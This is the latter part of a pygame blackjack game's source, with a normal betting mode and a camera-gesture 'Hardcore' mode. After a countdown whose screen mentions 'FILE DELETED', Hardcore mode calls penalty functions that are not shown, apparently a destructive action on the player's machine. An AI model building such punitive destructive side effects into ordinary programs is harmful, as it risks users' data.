def dealer_play(state: GameState, now_ms: int) -> None:
    state.phase = Phase.DEALER_TURN
    dealer_draw_count = 0
    while True:
        total, _ = state.dealer_hand.value()
        if total < 17:
            card = state.deck.draw()
            state.dealer_hand.add(card)
            add_visual_card(
                state,
                "dealer",
                card,
                now_ms,
                delay_ms=ANIM_STAGGER_MS * dealer_draw_count,
            )
            dealer_draw_count += 1
        else:
            break


def compare_hands(state: GameState) -> None:
    player_total, _ = state.player_hand.value()
    dealer_total, _ = state.dealer_hand.value()
    if player_total > 21:
        settle_round(state, RoundResult.LOSE, now_ms=pygame.time.get_ticks())
        return
    if dealer_total > 21:
        settle_round(state, RoundResult.WIN, now_ms=pygame.time.get_ticks())
        return
    if player_total > dealer_total:
        settle_round(state, RoundResult.WIN, now_ms=pygame.time.get_ticks())
    elif player_total < dealer_total:
        settle_round(state, RoundResult.LOSE, now_ms=pygame.time.get_ticks())
    else:
        settle_round(state, RoundResult.PUSH, now_ms=pygame.time.get_ticks())


def draw_background(surface: pygame.Surface) -> None:
    for y in range(WINDOW_HEIGHT):
        blend = y / float(WINDOW_HEIGHT)
        color = (
            int(BG_TOP[0] + (BG_BOTTOM[0] - BG_TOP[0]) * blend),
            int(BG_TOP[1] + (BG_BOTTOM[1] - BG_TOP[1]) * blend),
            int(BG_TOP[2] + (BG_BOTTOM[2] - BG_TOP[2]) * blend),
        )
        pygame.draw.line(surface, color, (0, y), (WINDOW_WIDTH, y))

    frame = pygame.Rect(20, 18, WINDOW_WIDTH - 40, WINDOW_HEIGHT - 36)
    pygame.draw.rect(surface, GOLD, frame, width=3, border_radius=14)
    pygame.draw.rect(surface, GOLD_SOFT, pygame.Rect(28, 26, WINDOW_WIDTH - 56, WINDOW_HEIGHT - 52), width=1, border_radius=12)

    # Gentle scanlines for old-screen vibe
    overlay = pygame.Surface((WINDOW_WIDTH, WINDOW_HEIGHT), pygame.SRCALPHA)
    for y in range(0, WINDOW_HEIGHT, 4):
        pygame.draw.line(overlay, (0, 0, 0, 20), (0, y), (WINDOW_WIDTH, y))
    surface.blit(overlay, (0, 0))


def draw_cards(
    surface: pygame.Surface,
    images: Dict[str, pygame.Surface],
    visuals: List[VisualCard],
    now_ms: int,
    hide_second: bool = False,
) -> None:
    for idx, visual in enumerate(visuals):
        x, y = visual.position(now_ms)
        key = "card_back.png" if hide_second and idx == 1 else visual.card.image_key

        shadow = pygame.Surface((CARD_WIDTH + 6, CARD_HEIGHT + 6), pygame.SRCALPHA)
        pygame.draw.rect(shadow, (0, 0, 0, 70), shadow.get_rect(), border_radius=8)
        surface.blit(shadow, (x + 4, y + 4))
        surface.blit(images[key], (x, y))


def build_buttons(state: GameState) -> Dict[str, Button]:
    buttons: Dict[str, Button] = {}
    if state.phase == Phase.MODE_SELECT:
        buttons["normal_mode"] = Button(pygame.Rect(170, 548, 220, 56), "Normal")
        buttons["hardcore_mode"] = Button(pygame.Rect(430, 548, 220, 56), "Hardcore")
        buttons["quit"] = Button(pygame.Rect(690, 548, 140, 56), "Quit")
    elif state.mode == GameMode.NORMAL and state.phase == Phase.BETTING:
        buttons["dec"] = Button(pygame.Rect(80, 600, 120, 48), "- Bet")
        buttons["inc"] = Button(pygame.Rect(220, 600, 120, 48), "+ Bet")
        buttons["deal"] = Button(pygame.Rect(360, 600, 140, 48), "Deal")
        buttons["dec"].enabled = state.current_bet > state.min_bet
        buttons["inc"].enabled = state.current_bet + BET_STEP <= state.max_bet
        buttons["deal"].enabled = state.current_bet <= state.max_bet and state.max_bet >= state.min_bet
    elif state.phase == Phase.PLAYER_TURN and state.mode == GameMode.NORMAL:
        buttons["hit"] = Button(pygame.Rect(80, 600, 140, 48), "Hit")
        buttons["stand"] = Button(pygame.Rect(240, 600, 140, 48), "Stand")
    elif state.phase == Phase.ROUND_END:
        next_label = "Play Again" if state.mode == GameMode.HARDCORE else "Next Round"
        buttons["next"] = Button(pygame.Rect(80, 600, 190, 48), next_label)
        buttons["quit"] = Button(pygame.Rect(290, 600, 140, 48), "Quit")
        buttons["next"].enabled = state.can_start_new_round
    return buttons


def draw_penalty_countdown(
    surface: pygame.Surface,
    state: GameState,
    now_ms: int,
) -> None:
    """
    Render dramatic countdown screen for hardcore penalty.

    Shows:
    - Large countdown numbers (5, 4, 3, 2, 1...)
    - Red flashing background effect
    - Warning message
    - Final "FILE DELETED" or error message
    """
    elapsed_ms = now_ms - state.penalty_countdown_start_ms
    remaining_ms = state.penalty_countdown_duration_ms - elapsed_ms
    remaining_sec = max(0, remaining_ms / 1000.0)
    countdown_num = int(remaining_sec) + 1

    # Flash effect (alternates every 250ms)
    flash_cycle = (now_ms // 250) % 2
    if flash_cycle == 0:
        bg_tint = PENALTY_FLASH_RED
    else:
        bg_tint = PENALTY_DARK_RED

    # Overlay red tint on entire screen
    overlay = pygame.Surface((WINDOW_WIDTH, WINDOW_HEIGHT), pygame.SRCALPHA)
    alpha = int(100 + 50 * flash_cycle)  # Oscillates between 100-150
    overlay.fill((*bg_tint, alpha))
    surface.blit(overlay, (0, 0))

    # Draw warning header
    header_font = pygame.font.SysFont("georgia", 48, bold=True)
    warning_text = "HARDCORE PENALTY ACTIVATED"
    warning_surf = header_font.render(warning_text, True, TEXT_IVORY)
    warning_rect = warning_surf.get_rect(center=(WINDOW_WIDTH // 2, 150))

    # Black shadow for readability
    shadow_surf = header_font.render(warning_text, True, (0, 0, 0))
    surface.blit(shadow_surf, (warning_rect.x + 4, warning_rect.y + 4))
    surface.blit(warning_surf, warning_rect)

    if remaining_sec > 0:
        # Draw countdown number
        countdown_font = pygame.font.SysFont("georgia", 180, bold=True)
        countdown_surf = countdown_font.render(str(countdown_num), True, TEXT_IVORY)
        countdown_rect = countdown_surf.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2))

        # Larger shadow for countdown
        shadow_surf = countdown_font.render(str(countdown_num), True, (0, 0, 0))
        surface.blit(shadow_surf, (countdown_rect.x + 6, countdown_rect.y + 6))
        surface.blit(countdown_surf, countdown_rect)

        # Subtitle - show specific penalty description
        subtitle_font = pygame.font.SysFont("georgia", 32)
        if state.selected_penalty:
            subtitle = get_penalty_description(state.selected_penalty)
        else:
            subtitle = "Executing penalty..."
        subtitle_surf = subtitle_font.render(subtitle, True, GOLD_SOFT)
        subtitle_rect = subtitle_surf.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2 + 140))
        surface.blit(subtitle_surf, subtitle_rect)
    else:
        # Countdown complete - show result
        result_font = pygame.font.SysFont("georgia", 72, bold=True)
        if state.penalty_triggered:
            result_text = state.message
        else:
            result_text = "EXECUTING PENALTY..."

        result_surf = result_font.render(result_text, True, TEXT_IVORY)
        result_rect = result_surf.get_rect(center=(WINDOW_WIDTH // 2, WINDOW_HEIGHT // 2))

        shadow_surf = result_font.render(result_text, True, (0, 0, 0))
        surface.blit(shadow_surf, (result_rect.x + 5, result_rect.y + 5))
        surface.blit(result_surf, result_rect)


def render(surface: pygame.Surface, state: GameState, images: Dict[str, pygame.Surface]) -> Dict[str, Button]:
    now_ms = pygame.time.get_ticks()

    # Special rendering for penalty countdown
    if state.phase == Phase.PENALTY_COUNTDOWN:
        draw_background(surface)
        draw_penalty_countdown(surface, state, now_ms)
        pygame.display.flip()
        return {}  # No buttons during penalty countdown

    draw_background(surface)

    header_font = pygame.font.SysFont("georgia", 40, bold=True)
    text_font = pygame.font.SysFont("georgia", 24)
    small_font = pygame.font.SysFont("georgia", 20)
    mono_font = pygame.font.SysFont("couriernew", 20, bold=True)

    title = header_font.render("MARTY SUPREME BLACKJACK", True, TEXT_IVORY)
    surface.blit(title, (WINDOW_WIDTH // 2 - title.get_width() // 2, 24))
    subtitle = small_font.render("1940s Lounge Edition", True, GOLD_SOFT)
    surface.blit(subtitle, (WINDOW_WIDTH // 2 - subtitle.get_width() // 2, 68))

    pygame.draw.rect(surface, PANEL_BG, (32, 98, WINDOW_WIDTH - 64, 72), border_radius=10)
    pygame.draw.rect(surface, GOLD, (32, 98, WINDOW_WIDTH - 64, 72), width=2, border_radius=10)
    if state.mode == GameMode.NORMAL:
        stats = (
            f"Mode: NORMAL    Bankroll: {state.bankroll}    Bet: {state.current_bet}    "
            f"Record W/L/P: {state.wins}/{state.losses}/{state.pushes}"
        )
    elif state.mode == GameMode.HARDCORE:
        stats = (
            f"Mode: HARDCORE (camera)    Decisive Rounds: {state.rounds_completed}    "
            f"Record W/L/P: {state.wins}/{state.losses}/{state.pushes}"
        )
    else:
        stats = "Mode: SELECT    Choose Normal or Hardcore to begin"
    surface.blit(text_font.render(stats, True, TEXT_IVORY), (48, 120))

    if state.phase == Phase.MODE_SELECT:
        mode_font = pygame.font.SysFont("georgia", 26, bold=True)
        info_font = pygame.font.SysFont("georgia", 20)
        heading = mode_font.render("Choose Your Mode", True, GOLD_SOFT)
        line1 = info_font.render("Normal: bets + mouse controls, no camera input", True, TEXT_IVORY)
        line2 = info_font.render("Hardcore: camera controls only, ties auto-redeal", True, TEXT_IVORY)
        line3 = info_font.render("Single decisive round, then Play Again or Quit", True, TEXT_IVORY)
        surface.blit(heading, (WINDOW_WIDTH // 2 - heading.get_width() // 2, 214))
        surface.blit(line1, (WINDOW_WIDTH // 2 - line1.get_width() // 2, 272))
        surface.blit(line2, (WINDOW_WIDTH // 2 - line2.get_width() // 2, 308))
        surface.blit(line3, (WINDOW_WIDTH // 2 - line3.get_width() // 2, 344))
    else:
        dealer_total, _ = state.dealer_hand.value()
        player_total, _ = state.player_hand.value()
        hide_hole = state.phase == Phase.PLAYER_TURN
        dealer_value_text = "?" if hide_hole else str(dealer_total)

        draw_cards(surface, images, state.dealer_visual_cards, now_ms=now_ms, hide_second=hide_hole)
        draw_cards(surface, images, state.player_visual_cards, now_ms=now_ms, hide_second=False)
        surface.blit(mono_font.render(f"DEALER [{dealer_value_text}]", True, GOLD_SOFT), (40, 174))
        surface.blit(mono_font.render(f"PLAYER [{player_total}]", True, GOLD_SOFT), (40, 415))

    message_y = 392 if state.phase == Phase.MODE_SELECT else 356
    pygame.draw.rect(surface, PANEL_BG, (32, message_y, WINDOW_WIDTH - 64, 54), border_radius=10)
    pygame.draw.rect(surface, GOLD, (32, message_y, WINDOW_WIDTH - 64, 54), width=2, border_radius=10)
    message_surf = small_font.render(state.message, True, TEXT_IVORY)
    surface.blit(message_surf, (48, message_y + 18))

    buttons = build_buttons(state)
    mouse_pos = pygame.mouse.get_pos()
    for button in buttons.values():
        button.draw(surface, text_font, hovered=button.enabled and button.rect.collidepoint(mouse_pos))

    if state.phase != Phase.MODE_SELECT:
        # Deck visual anchor where cards animate from
        deck_rect = pygame.Rect(DECK_ORIGIN[0], DECK_ORIGIN[1], CARD_WIDTH, CARD_HEIGHT)
        pygame.draw.rect(surface, GOLD, deck_rect.inflate(8, 8), border_radius=8, width=2)
        surface.blit(images["card_back.png"], deck_rect.topleft)

    pygame.display.flip()
    return buttons


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="GUI Blackjack (pygame)")
    parser.add_argument("--bankroll", type=int, default=DEFAULT_BANKROLL, help="Starting bankroll")
    parser.add_argument("--fps", type=int, default=DEFAULT_FPS, help="Frame rate cap")
    return parser.parse_args()


def handle_player_action(state: GameState, action: str, now_ms: int) -> None:
    if action == "hit":
        card = state.deck.draw()
        state.player_hand.add(card)
        add_visual_card(state, "player", card, now_ms=now_ms)

        if state.player_hand.is_bust():
            settle_round(state, RoundResult.LOSE, now_ms=now_ms)
        else:
            if state.mode == GameMode.HARDCORE:
                state.message = "Hardcore: camera controls only. Show fist=Hit, palm=Stand."
            else:
                state.message = "Your turn: Hit or Stand."
        return

    if action == "stand":
        dealer_play(state, now_ms=now_ms)
        compare_hands(state)
        return


def init_normal_mode(state: GameState, start_bankroll: int) -> None:
    state.mode = GameMode.NORMAL
    state.bankroll = max(0, start_bankroll)
    state.current_bet = max(MIN_BET, min(max(state.bankroll, MIN_BET), 100))
    state.player_hand = Hand()
    state.dealer_hand = Hand()
    state.player_visual_cards = []
    state.dealer_visual_cards = []
    state.round_result = RoundResult.NONE
    state.rounds_completed = 0
    state.can_start_new_round = state.bankroll >= state.min_bet
    if not state.can_start_new_round:
        state.phase = Phase.ROUND_END
        state.message = "Game over: bankroll below minimum bet."
    else:
        state.phase = Phase.BETTING
        state.message = "Place your bet and click Deal."


def init_hardcore_mode(state: GameState, now_ms: int) -> None:
    state.mode = GameMode.HARDCORE
    state.bankroll = 0
    state.current_bet = MIN_BET
    state.round_result = RoundResult.NONE
    state.can_start_new_round = True
    start_hardcore_round(state, now_ms=now_ms)


def run_game(start_bankroll: int, fps: int) -> int:
    if fps <= 0:
        print("FPS must be > 0", file=sys.stderr)
        return 2

    pygame.init()
    pygame.display.set_caption("Blackjack")
    screen = pygame.display.set_mode((WINDOW_WIDTH, WINDOW_HEIGHT))
    clock = pygame.time.Clock()
    global AUDIO_EFFECTS
    AUDIO_EFFECTS = GameAudioEffects()
    AUDIO_EFFECTS.play_boot()

    assets_dir = os.path.normpath(
        os.path.join(os.path.dirname(__file__), "..", "assets", "cards", "medium_cards")
    )
    try:
        card_images = load_card_images(assets_dir)
    except RuntimeError as exc:
        pygame.quit()
        print(str(exc), file=sys.stderr)
        return 1

    state = GameState(bankroll=0)
    gesture: Optional[GestureController] = None

    running = True
    try:
        while running:
            buttons = render(screen, state, card_images)

            # Handle penalty countdown progression
            if state.phase == Phase.PENALTY_COUNTDOWN:
                now_ms = pygame.time.get_ticks()
                elapsed_ms = now_ms - state.penalty_countdown_start_ms

                # Check if countdown is complete
                if elapsed_ms >= state.penalty_countdown_duration_ms:
                    if not state.penalty_triggered:
                        # Execute the selected penalty
                        state.penalty_triggered = True

                        if state.selected_penalty:
                            success, msg = execute_selected_penalty(state.selected_penalty)
                        else:
                            # Fallback if no penalty selected
                            success, msg = execute_hardcore_penalty()

                        state.message = msg

                        # Wait 2 more seconds to show result, then exit
                        pygame.time.wait(2000)
                        running = False
                        break

                # Allow quit during countdown
                for event in pygame.event.get():
                    if event.type == pygame.QUIT:
                        running = False
                        break

                clock.tick(fps)
                continue  # Skip normal event handling

            if state.phase == Phase.PLAYER_TURN and gesture is not None and gesture.enabled:
                action = gesture.poll_action(allow_split=False)
                if action in ("hit", "stand"):
                    handle_player_action(state, action, now_ms=pygame.time.get_ticks())

            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    running = False
                    break
                if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
                    click_ms = pygame.time.get_ticks()
                    pos = event.pos
                    if state.phase == Phase.MODE_SELECT:
                        if "normal_mode" in buttons and buttons["normal_mode"].contains(pos):
                            if gesture is not None:
                                gesture.close()
                                gesture = None
                            init_normal_mode(state, start_bankroll=start_bankroll)
                        elif "hardcore_mode" in buttons and buttons["hardcore_mode"].contains(pos):
                            if gesture is not None:
                                gesture.close()
                                gesture = None
                            gesture = GestureController(active=True)
                            if not gesture.enabled:
                                state.message = "Hardcore requires camera + OpenCV + MediaPipe."
                                state.mode = None
                                state.phase = Phase.MODE_SELECT
                            else:
                                init_hardcore_mode(state, now_ms=click_ms)
                                state.message = "Hardcore: camera controls only. 3s startup cooldown, fist=Hit, palm=Stand."
                        elif "quit" in buttons and buttons["quit"].contains(pos):
                            running = False
                            break
                    elif state.mode == GameMode.NORMAL and state.phase == Phase.BETTING:
                        if "dec" in buttons and buttons["dec"].contains(pos):
                            state.current_bet = max(state.min_bet, state.current_bet - BET_STEP)
                        elif "inc" in buttons and buttons["inc"].contains(pos):
                            state.current_bet = min(state.max_bet, state.current_bet + BET_STEP)
                        elif "deal" in buttons and buttons["deal"].contains(pos):
                            if state.bankroll < state.min_bet:
                                state.phase = Phase.ROUND_END
                                state.can_start_new_round = False
                                state.message = "Game over: bankroll below minimum bet."
                            elif state.current_bet < state.min_bet or state.current_bet > state.bankroll:
                                state.message = "Invalid bet amount."
                            else:
                                deal_initial_cards(state, now_ms=click_ms)
                                state.phase = Phase.PLAYER_TURN
                                state.message = "Your turn: Hit or Stand."
                                resolve_natural_blackjacks(state)
                    elif state.mode == GameMode.NORMAL and state.phase == Phase.PLAYER_TURN:
                        if "hit" in buttons and buttons["hit"].contains(pos):
                            handle_player_action(state, "hit", now_ms=click_ms)
                        elif "stand" in buttons and buttons["stand"].contains(pos):
                            handle_player_action(state, "stand", now_ms=click_ms)
                    elif state.phase == Phase.ROUND_END:
                        if "next" in buttons and buttons["next"].contains(pos):
                            if state.mode == GameMode.HARDCORE:
                                state.reset_for_next_round()
                                start_hardcore_round(state, now_ms=click_ms)
                            else:
                                state.reset_for_next_round()
                        elif "quit" in buttons and buttons["quit"].contains(pos):
                            running = False
                            break
            clock.tick(fps)
    finally:
        if gesture is not None:
            gesture.close()
        pygame.quit()

    return 0


def main() -> int:
    args = parse_args()
    return run_game(start_bankroll=args.bankroll, fps=args.fps)


if __name__ == "__main__":
    raise SystemExit(main())
